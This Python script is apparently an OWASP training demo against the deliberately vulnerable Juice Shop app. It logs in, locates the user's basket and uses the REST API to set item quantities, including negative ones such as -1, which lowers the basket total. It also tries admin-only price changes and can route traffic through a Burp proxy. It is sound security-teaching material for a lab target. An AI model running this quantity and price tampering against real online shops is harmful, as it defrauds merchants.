#!/usr/bin/env python3
"""
Set basket item quantities (and optionally prices) for multiple ProductIds.
OWASP A04 Insecure Design demo against OWASP Juice Shop.

Examples:
  --product 1 9 --quantity -1 5
  --product 1 6 24 --quantity 2               (broadcast qty=2 to all)
  --product 1 6 --quantity 5 --price 0.49 1.99  (price needs admin)
"""
import argparse, time, requests
from typing import List, Optional

def parse_args():
    ap = argparse.ArgumentParser(
        description="Multi-product basket quantity setter (A04 Insecure Design)"
    )
    ap.add_argument("--base", required=True, help="Base URL, e.g. http://127.0.0.1:3000")
    ap.add_argument("--email", required=True, help="Juice Shop user email")
    ap.add_argument("--password", required=True, help="Password")
    ap.add_argument("--product", nargs="+", type=int, required=True,
                    help="One or more ProductIds (space-separated)")
    ap.add_argument("--quantity", nargs="+", type=int, required=True,
                    help="Quantity or list of quantities (broadcast if single)")
    ap.add_argument("--price", nargs="*", type=float,
                    help="Optional price(s) for products (admin only). Broadcast if single.")
    ap.add_argument("--basket", type=int, help="BasketId (faster). If omitted, tool will try to find one.")
    ap.add_argument("--timeout", type=float, default=15.0, help="Request timeout seconds")
    ap.add_argument("--burp", help="Proxy like http://127.0.0.1:8080 (Intercept OFF)")
    return ap.parse_args()

# --- HTTP helpers -------------------------------------------------------------

def login(session: requests.Session, base: str, email: str, password: str, timeout: float) -> str:
    r = session.post(f"{base}/rest/user/login",
                     json={"email": email, "password": password},
                     timeout=timeout)
    r.raise_for_status()
    js = r.json()
    token = (js.get("authentication") or {}).get("token") or js.get("token")
    if not token:
        raise RuntimeError(f"No JWT token in login response: {js}")
    session.headers.update({"Authorization": f"Bearer {token}"})
    return token

def whoami_basket_id(session: requests.Session, base: str, timeout: float) -> Optional[int]:
    r = session.get(f"{base}/rest/user/whoami", timeout=timeout)
    r.raise_for_status()
    info = r.json()
    bid = (
        info.get("bid")
        or (info.get("basket") or {}).get("id")
        or info.get("basketId")
        or (info.get("user") or {}).get("basketId")
    )
    return bid

def rest_basket(session: requests.Session, base: str, bid: int, timeout: float) -> dict:
    r = session.get(f"{base}/rest/basket/{bid}", timeout=timeout)
    r.raise_for_status()
    return r.json()

def ensure_item(session: requests.Session, base: str, bid: int, pid: int, timeout: float) -> int:
    """Return BasketItem id for (bid,pid). If absent, add 1 and return new id."""
    js = rest_basket(session, base, bid, timeout)
    products = (js.get("data") or {}).get("Products") or []
    for p in products:
        if p.get("id") == pid and p.get("BasketItem", {}).get("id"):
            return p["BasketItem"]["id"]
    # not found -> add one
    r = session.post(f"{base}/api/BasketItems/",
                     json={"BasketId": bid, "ProductId": pid, "quantity": 1},
                     timeout=timeout)
    r.raise_for_status()
    js = r.json()
    return js.get("id") or (js.get("data") or {}).get("id")

def set_qty(session: requests.Session, base: str, item_id: int, qty: int, timeout: float) -> requests.Response:
    return session.put(f"{base}/api/BasketItems/{item_id}",
                       json={"quantity": qty}, timeout=timeout)

def get_total(session: requests.Session, base: str, bid: int, timeout: float) -> Optional[float]:
    try:
        js = rest_basket(session, base, bid, timeout)
        return js.get("grandTotal") or (js.get("cart") or {}).get("grandTotal")
    except Exception:
        return None

def set_price(session: requests.Session, base: str, product_id: int, price: float, timeout: float) -> Optional[int]:
    """
    Attempts to update product price (admin only). If unauthorized, just returns None.
    """
    r = session.put(f"{base}/api/Products/{product_id}",
                    json={"price": price},
                    timeout=timeout)
    if not r.ok:
        # Most users are not admin; ignore errors gracefully
        return None
    try:
        return (r.json().get("data") or {}).get("id") or r.json().get("id")
    except Exception:
        return None

# --- main --------------------------------------------------------------------

def main():
    a = parse_args()
    base = a.base.rstrip("/")
    s = requests.Session()
    s.headers.update({"User-Agent": "AuthProbe-JS/1.0 (+lab)"})
    if a.burp:
        s.proxies = {"http": a.burp, "https": a.burp}
        s.verify = False

    login(s, base, a.email, a.password, a.timeout)

    # basket discovery
    bid = a.basket or whoami_basket_id(s, base, a.timeout)
    if not bid:
        raise RuntimeError("No basket id. Add any item once in the UI (to create a basket), or pass --basket.")

    # Normalize quantities/prices to lists aligned with products
    prods: List[int] = a.product
    qtys: List[int] = a.quantity
    if len(qtys) == 1:
        qtys = [qtys[0]] * len(prods)
    if len(qtys) != len(prods):
        raise SystemExit("Error: --quantity count must be 1 or equal to --product count.")

    prices: Optional[List[float]] = None
    if a.price:
        prices = a.price
        if len(prices) == 1:
            prices = [prices[0]] * len(prods)
        if len(prices) != len(prods):
            raise SystemExit("Error: --price count must be 1 or equal to --product count.")

    before = get_total(s, base, bid, a.timeout)
    for i, pid in enumerate(prods):
        iid = ensure_item(s, base, bid, pid, a.timeout)
        if prices:
            set_price(s, base, pid, prices[i], a.timeout)  # may silently fail for non-admin
        r = set_qty(s, base, iid, qtys[i], a.timeout)
        after = get_total(s, base, bid, a.timeout)
        print(f"[+] Basket {bid}: Product {pid} -> BasketItem {iid}, qty={qtys[i]} -> HTTP {r.status_code}, grandTotal={after}")
        time.sleep(0.15)

    print("\nDone.")

if __name__ == "__main__":
    main()
